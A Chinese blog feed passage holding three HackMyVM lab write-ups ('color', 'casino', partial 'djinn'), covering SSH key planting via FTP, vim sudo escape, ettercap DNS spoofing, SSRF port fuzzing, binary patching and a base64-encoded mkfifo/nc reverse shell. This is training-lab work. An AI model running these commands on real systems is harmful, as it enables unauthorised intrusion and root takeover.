<h5 id="一个问题"><a href="#一个问题" class="headerlink" title="一个问题"></a>一个问题</h5><p>知道了这个思路，我按照常规思路knock三个端口，然而22端口没有按照预期的打开，我试了很多次，还是失败，也不知道原因。第二天为了想实践后面的关卡，想着干脆关了防火墙，所以借助grub登陆root，按照网上给的命令总是失败，更头疼了。然后就想看看knock的配置文件，找到日志文件，一看到enp0s3我就想到要改成enp01，思路就来了。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2014.56.31.png" ></p>
<p>于是经过一番搜索，找到&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;knockd.service，把里面的enp0s3改成enp0s1，再启动靶机</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.24.31.png" ></p>
<p>这次就可以了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320160752.png" ></p>
<p>虽然这个问题是针对自己的电脑产生的，别人的电脑可能不会出现这样的情况，但是整个过程是自己一点一点摸索到，最后成功解决的时候真的很开心，所以值得记录一下。</p>
<h4 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h4><p>ok解决了ssh的问题，想用之前拿到的pink账号密码登陆，还是失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161201.png" ></p>
<p>报错说publickey，说明需要密钥文件登陆。搞半天pink的账号密码可以用ftp登陆，对ftp的敏感度还不够，一直没想到，登陆后</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161544.png" ></p>
<p>pink目录下有.ssh目录，<strong>思路是在里面上传自己kali的id_rsa.pub（命名为authorized_keys)，然后用那个文件为凭证自己kali登陆ssh</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161803.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161819.png" ></p>
<p>登陆成功</p>
<h4 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h4><p>拿到pink的shell后没能发现什么，接下来的思路是去到&#x2F;var&#x2F;www&#x2F;html上传一个a.php，再在网页端访问a.php，就拿到www-data的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320212842.png" ></p>
<p>Sudo -l查看到green有vim可以利用提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u green /usr/bin/vim</span><br></pre></td></tr></table></figure>

<p>再输入’:!&#x2F;bin&#x2F;sh’，成功拿到green的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320213122.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">green@color:/var/www/html$ <span class="built_in">cd</span> /home/green</span><br><span class="line"><span class="built_in">cd</span> /home/green</span><br><span class="line">green@color:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">note.txt  test_4_green</span><br><span class="line">green@color:~$ <span class="built_in">cat</span> no</span><br><span class="line"><span class="built_in">cat</span> note.txt</span><br><span class="line">You<span class="string">&#x27;ve been working very well lately Green, so I&#x27;</span>m going to give you one last <span class="built_in">test</span>. If you pass it I<span class="string">&#x27;ll give you the password for purple.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-root</span></span><br><span class="line"><span class="string">green@color:~$ ./test_4_green</span></span><br><span class="line"><span class="string">./test_4_green</span></span><br><span class="line"><span class="string">Guess the number im thinking: 1</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Nope, sorry</span></span><br><span class="line"><span class="string">green@color:~$</span></span><br></pre></td></tr></table></figure>

<p>到green到家目录下大致可以利用的就是test_4_green，下载到本地，ida打开查看一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.48.22.png" ></p>
<p>注意到有个jnz比较</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.50.38.png" ></p>
<p>大致就是比较v8和v7，这里用ida修改一下jnz为jz</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320215526.png" ></p>
<p>保存后再执行，随便输入一个数字也会爆出密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.57.24.png" ></p>
<p>接着就登陆purple账户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">purple@color:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> purple on color:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User purple may run the following commands on color:</span><br><span class="line">    (root) NOPASSWD: /attack_dir/ddos.sh</span><br><span class="line">purple@color:~$ <span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p</span><br></pre></td></tr></table></figure>

<p>sudo -l发现有个脚本可以用，就是要下载masterddos.hmv下的attack.sh然后交给&#x2F;usr&#x2F;bin&#x2F;sh 执行</p>
<p><strong>思路是利用dns欺骗，让靶机向自己的kali发送请求，自己的kali伪造一个attack.sh，让靶机访问</strong></p>
<p>步骤：</p>
<p>先在修改&#x2F;etc&#x2F;ettercap&#x2F;etter.dns文件，增加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masterddos.hmv A 192.168.64.3</span><br></pre></td></tr></table></figure>

<p>然后开始dns攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ettercap -i eth0 -Tp -M arp:remote -P dns_spoof /192.168.64.92// /192.168.64.1//</span><br></pre></td></tr></table></figure>

<p>在靶机去ping masterddos.hmv，回复的ip是kali的ip，DNS欺骗执行成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">purple@color:~$ ping masterddos.hmv</span><br><span class="line">ping masterddos.hmv</span><br><span class="line">PING masterddos.hmv (192.168.64.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=1 ttl=64 time=1.49 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=2 ttl=64 time=0.915 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=3 ttl=64 time=0.972 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=4 ttl=64 time=1.08 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=5 ttl=64 time=0.681 ms</span><br></pre></td></tr></table></figure>

<p>接着就sudo &#x2F;attack_dir&#x2F;ddos.sh执行脚本</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320222448.png" ></p>
<p>成功拿到root的shell，提权成功。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>第一次遇到<strong>DNS欺骗</strong>，学到了，通过ftp敲门那里思路比较清奇，要打破惯性思维，不要一看到账号密码只想到ssh的网页，还有ftp！可执行文件修改（二进制方向的魅力），knock开端口（注意网卡配置），还有一般都是先拿到www-data再拿到其他账户的shell，这次是先有个pink才有www-data。</p>
<p>这么理下来知识点也不是特别多，但我就要消化好久，自己做的时候没办法想到的思路无非就是因为知识面不够广，还有就是脑子不够灵活（比如没想到拿账号密码登陆ftp），路漫漫。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm casino复盘</title>
    <url>/2024/03/18/hackmyvm-casino%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Casino" >https://hackmyvm.eu/machines/machine.php?vm=Casino<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>靶机ip：192.168.64.82</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>端口扫描扫到22和80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165203.png" ></p>
<p>先到80端口，有个登陆页面，不知道账号密码，先注册一个账号</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165317.png" ></p>
<p>登陆进去后有个三个赌博游戏，起始金额是1000$，经过一番探索结合扫到的目录，我随便在猜点数的游戏把金额全部输光，接着界面就给我跳转到以下这个</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165533.png" ></p>
<p>注意url是”<strong>&#x2F;casino&#x2F;explainmepls.php?learnabout&#x3D;en.wikipedia.org&#x2F;wiki&#x2F;Dice</strong>“，经过测试没办法文件包含查看一下文件，但是?learnabout&#x3D;<a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a> 会跳转，猜测是存在ssrf漏洞，验证一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165739.png" ></p>
<p>会出现最开始看到的登陆页面，接着就fuzz一下对内有哪些端口开了（记得带上cookie）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>; i&lt;=<span class="number">65535</span>; i++)); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> &gt;&gt; dictionary.txt</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">先生成一个脚本</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w dictionary.txt -u <span class="string">&#x27;http://192.168.64.82/casino/explainmepls.php?learnabout=127.0.0.1:FUZZ&#x27;</span> -fw 284 -b <span class="string">&quot;PHPSPHPSESSID=kd3kcoc7nogvaeqsqktu0ktctb&quot;</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318182217.png" ></p>
<p>扫到了6969端口，先访问看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002002.png" ></p>
<p>是有东西的，扫一下目录看看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u <span class="string">&quot;http://192.168.64.82/casino/explainmepls.php?learnabout=localhost:6969/FUZZ&quot;</span> -b <span class="string">&quot;PHPSESSID=kd3kcoc7nogvaeqsqktu0ktctb&quot;</span> -fw 284</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319004853.png" ></p>
<p>扫到&#x2F;codebreakers，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2000.23.29.png" ></p>
<p>看到源码有个shimmer_rsa，访问之后意识一个私钥内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002436.png" ></p>
<p>保存之后利用这个文件ssh登陆成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002651.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002957.png" ></p>
<p>可以看到目录下有个pass，是可以执行的，是要猜密码，传到本地用ida分析看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2000.31.48.png"  alt="main函数"></p>
<p>点击看一下第一个密码的checkpasswd函数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319003547.png" ></p>
<p>有很多个表达式去匹配，我想到用z3去运算出结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建26个变量，每个变量表示字符串中对应位置的字符</span></span><br><span class="line">a = [Int(<span class="string">&#x27;a[%d]&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Z3 solver 实例</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加字符串长度等于 26 的约束</span></span><br><span class="line">solver.add(<span class="built_in">len</span>(a) == <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加各种条件约束</span></span><br><span class="line">solver.add(a[<span class="number">0</span>] - a[<span class="number">20</span>] == -<span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">1</span>] + a[<span class="number">6</span>] == <span class="number">208</span>)</span><br><span class="line">solver.add(a[<span class="number">2</span>] - a[<span class="number">4</span>] == <span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">3</span>] - a[<span class="number">14</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">4</span>] * a[<span class="number">25</span>] == <span class="number">10100</span>)</span><br><span class="line">solver.add(a[<span class="number">5</span>] + a[<span class="number">17</span>] == <span class="number">219</span>)</span><br><span class="line">solver.add(a[<span class="number">6</span>] - a[<span class="number">10</span>] == -<span class="number">11</span>)</span><br><span class="line">solver.add(a[<span class="number">7</span>] - a[<span class="number">20</span>] == -<span class="number">10</span>)</span><br><span class="line">solver.add(a[<span class="number">8</span>] * a[<span class="number">17</span>] == <span class="number">11845</span>)</span><br><span class="line">solver.add(a[<span class="number">9</span>] - a[<span class="number">18</span>] == -<span class="number">7</span>)</span><br><span class="line">solver.add(a[<span class="number">10</span>] - a[<span class="number">24</span>] == <span class="number">1</span>)</span><br><span class="line">solver.add(a[<span class="number">11</span>] * a[<span class="number">4</span>] == <span class="number">9797</span>)</span><br><span class="line">solver.add(a[<span class="number">12</span>] - a[<span class="number">3</span>] == <span class="number">3</span>)</span><br><span class="line">solver.add(a[<span class="number">13</span>] * a[<span class="number">11</span>] == <span class="number">11252</span>)</span><br><span class="line">solver.add(a[<span class="number">14</span>] - a[<span class="number">13</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">15</span>] == a[<span class="number">23</span>])</span><br><span class="line">solver.add(a[<span class="number">16</span>] - a[<span class="number">8</span>] == -<span class="number">5</span>)</span><br><span class="line">solver.add(a[<span class="number">17</span>] * a[<span class="number">7</span>] == <span class="number">10815</span>)</span><br><span class="line">solver.add(a[<span class="number">18</span>] - a[<span class="number">14</span>] == -<span class="number">2</span>)</span><br><span class="line">solver.add(a[<span class="number">19</span>] - a[<span class="number">0</span>] == -<span class="number">8</span>)</span><br><span class="line">solver.add(a[<span class="number">20</span>] - a[<span class="number">23</span>] == <span class="number">4</span>)</span><br><span class="line">solver.add(a[<span class="number">21</span>] + a[<span class="number">7</span>] == <span class="number">220</span>)</span><br><span class="line">solver.add(a[<span class="number">22</span>] - a[<span class="number">1</span>] == <span class="number">15</span>)</span><br><span class="line">solver.add(a[<span class="number">23</span>] == a[<span class="number">15</span>])</span><br><span class="line">solver.add(a[<span class="number">24</span>] * a[<span class="number">2</span>] == <span class="number">12654</span>)</span><br><span class="line">solver.add(a[<span class="number">25</span>] - a[<span class="number">12</span>] == -<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查约束是否满足</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(model[a[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;满足条件的字符串为：&quot;</span>, result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;找不到满足条件的字符串&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>跑出来的结果是“满足条件的字符串为： ihopethisisastrongpassword”</p>
<p>这样就拿到第一个密码了，依次输入两个密码拿到一个&#x2F;bin&#x2F;sh，注意这里的点是</p>
<p><strong>程序中open了&#x2F;opt&#x2F;root.pass，但是没有close，可以看一下这个文件相关的进程</strong></p>
<p>“在linux中，每个进程的 <code>/proc/&lt;PID&gt;/fd</code> 目录包含了该进程打开的文件描述符的符号链接。你可以通过查看该目录来了解进程打开的文件描述符的相关信息，可以用<code>ls -l /proc/&lt;PID&gt;/fd</code>查看，而一个进程的PID可以用<code>lsof /path/to/your/file</code>查看”</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ lsof /opt/root.pass</span><br><span class="line">COMMAND PID    USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">sh      768 shimmer    3r   REG    8,1       15 522246 /opt/root.pass</span><br><span class="line">$ <span class="built_in">ls</span> -l /proc/768/fd</span><br><span class="line">total 0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 0 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 1 -&gt; /dev/pts/0</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 10 -&gt; /dev/tty</span><br><span class="line">lrwx------ 1 shimmer shimmer 64 mar 18 17:43 2 -&gt; /dev/pts/0</span><br><span class="line">lr-x------ 1 shimmer shimmer 64 mar 18 17:43 3 -&gt; /opt/root.pass</span><br><span class="line">$ <span class="built_in">cd</span> /proc/768/fd</span><br><span class="line">$ <span class="built_in">cat</span> &lt;&amp;3</span><br><span class="line">masteradmin420</span><br></pre></td></tr></table></figure>

<p>一顿操作，就拿到了root的密码，su登陆，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319004826.png" ></p>
<h4 id="web代码复盘"><a href="#web代码复盘" class="headerlink" title="web代码复盘"></a>web代码复盘</h4><p>在games.php找到跳转explainmepls.php的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$money</span> == <span class="number">0</span> &amp;&amp; <span class="variable">$game</span> != <span class="number">8</span>) &#123; <span class="comment">// 这里就是需要money=0，所以要把钱输光</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$game</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Shell_game&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Russian_roulette&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;en.wikipedia.org/wiki/Dice&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">include_once</span> <span class="string">&quot;./games/error.php&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: explainmepls.php?learnabout=&#x27;</span> . <span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2001.00.46.png" ></p>
<p>触发ssrf漏洞的地方，“<code>file_get_contents()</code> 函数用于从指定的 URL 中获取内容并将其输出。可以通过控制 <code>$learnabout</code> 变量来构造任意 URL”</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>wp说pass那块第一个密码可用angr模块解决，我自己看的时候先想到的是z3，最后也解出来了，后续要学一下</p>
<p>最开始那个赌博游戏也是经过一番探索才找到ssrf那个点，而且刚找到的时候还以为是文件包含（知识不够牢固）关于ssrf利用，端口的fuzz也需要记住，还有就是最后文件打开那块，还能通过lsof找到相关进程，感觉这个思路以后还会遇到，也算是多学习到linux有关的知识了，总的来说这个靶场很值得学习回顾。</p>
<p>所需知识点：ssrf漏洞利用，文件逆向，z3求解，linux进程号查找，端口扫描</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm djinn复盘</title>
    <url>/2024/03/18/hackmyvm-djinn%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/?v=djin" >https://hackmyvm.eu/machines/?v=djin<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>端口扫描，扫到21，1337，7331开放，先用anonymous作为账号密码登陆21号端口，有三个txt文件，下载来看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318105541.png" ></p>
<p>game里面说1337端口有个game，nc连接一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318105737.png" ></p>
<p>是个计算游戏，需要算对一千次，这种就需要写个脚本解决了（以下脚本是参考wp的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">c = pwn.remote(<span class="string">&#x27;192.168.64.80&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>) <span class="comment"># 建立一个远程联机</span></span><br><span class="line">c.recvuntil(<span class="string">&#x27;gift.\n&#x27;</span>) <span class="comment"># 接收连接中的数据，直到遇到字符串 &#x27;gift.\n&#x27; 为止</span></span><br><span class="line">count=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">1001</span>: <span class="comment"># 做1000次循环</span></span><br><span class="line">   count += <span class="number">1</span></span><br><span class="line">   data = c.recvuntil(<span class="string">b&quot;)&quot;</span>).decode()</span><br><span class="line">   c.recv() <span class="comment"># 接收连接中的数据，但不做任何处理，用于清空缓冲区</span></span><br><span class="line">   <span class="built_in">print</span>(data)</span><br><span class="line">   num1, num2, todo = <span class="built_in">int</span>(data[<span class="number">1</span>]), <span class="built_in">int</span>(data[<span class="number">9</span>]), data[<span class="number">5</span>]</span><br><span class="line">   <span class="keyword">if</span> todo == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">      answer= num1 + num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">      answer= num1 - num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">      answer= num1 * num2</span><br><span class="line">   <span class="keyword">elif</span> todo == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">      answer= num1 / num2</span><br><span class="line">   c.send((<span class="built_in">str</span>(answer) + <span class="string">&quot;\n\r&quot;</span>).encode())</span><br><span class="line">   <span class="keyword">if</span> count &gt; <span class="number">998</span>: <span class="comment"># 打印最后几次的详细信息</span></span><br><span class="line">        <span class="built_in">print</span>(answer, count)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.recv().decode())</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110431.png" ></p>
<p>跑完脚本最后给了三个数字，猜测是敲门，此时22端口是关着的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110523.png" ></p>
<p>按顺序敲门后，22号端口打开了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318110607.png" ></p>
<p>接着我想用刚刚拿到的“nitu:81299””nitish81299”尝试登陆ssh，都没有用，这个时候想到之前有个7331端口还没看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2012.07.20.png" ></p>
<p>先扫目录，用了一个大一点的字典后扫到有&#x2F;wish &#x2F;genie</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112555.png" ></p>
<p>访问&#x2F;wish，有个可以execute的，输入id试试</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318111003.png" ></p>
<p>跳转到了genie，注意url有出现www-data，说明是执行成功的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318111039.png" ></p>
<p>接下来反弹shell，经过多次尝试，发现可以利用拿到第一个shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ` <span class="built_in">echo</span> <span class="string">&quot;cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjY0LjMgODg4OCA+L3RtcC9m&quot;</span> | <span class="built_in">base64</span> -d ` | sh -</span><br><span class="line"></span><br><span class="line"><span class="built_in">base64</span>解码的内容是：<span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.64.3 8888 &gt;/tmp/f</span><br><span class="line">管道 ｜sh - 表示讲解码后的内容交给sh当成脚本执行</span><br></pre></td></tr></table></figure>

<h4 id="提权方式1"><a href="#提权方式1" class="headerlink" title="提权方式1"></a>提权方式1</h4><p>拿到第一个shell后，使用find查看有没有什么可以用（sudo -l找不到什么可以用的）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>看到pkexec可以用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2011.18.35.png" ></p>
<p>查找到版本是0.105，上网搜索了一下有没有可以用的脚本，最后找到<a class="link"   href="https://www.hackingarticles.in/linux-privilege-escalation-pwnkit-cve-2021-4034/" >https://www.hackingarticles.in/linux-privilege-escalation-pwnkit-cve-2021-4034/<i class="fas fa-external-link-alt"></i></a> 可以用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-18%2011.21.58.png" ></p>
<p>成功提权到root</p>
<h4 id="提权方法2"><a href="#提权方法2" class="headerlink" title="提权方法2"></a>提权方法2</h4><p>切换到home目录下，有nitish和sam两个用户，sam目录进不去，在nitish目录的.dev目录下有个creds.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112450.png" ></p>
<p>有一个密码，接下来用ssh登陆nitish账户</p>
<p>p4ssw0rdStr3r0n9</p>
<p>sudo -l发现有个genie可以利用，在网上找现成的提权方式失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112652.png" ></p>
<p>-h查看帮助，有一个-e执行cmd，但是还是失败了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318112941.png" ></p>
<p>然后用man查看genie，发现有个cmd</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113121.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u sam /usr/bin/genie -cmd 随便写点</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113234.png" ></p>
<p>成功拿到sam的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113352.png" ></p>
<p>sudo -l看到有个lago可以利用，执行看看，测试了一下，有几个选项，其中比较有用的是有个猜数游戏</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318113515.png" ></p>
<h5 id="解决思路1（暴力）"><a href="#解决思路1（暴力）" class="headerlink" title="解决思路1（暴力）"></a>解决思路1（暴力）</h5><p>用个一直循环的脚本，一直坚持猜同一个数字，看运气，总有能猜对的时候</p>
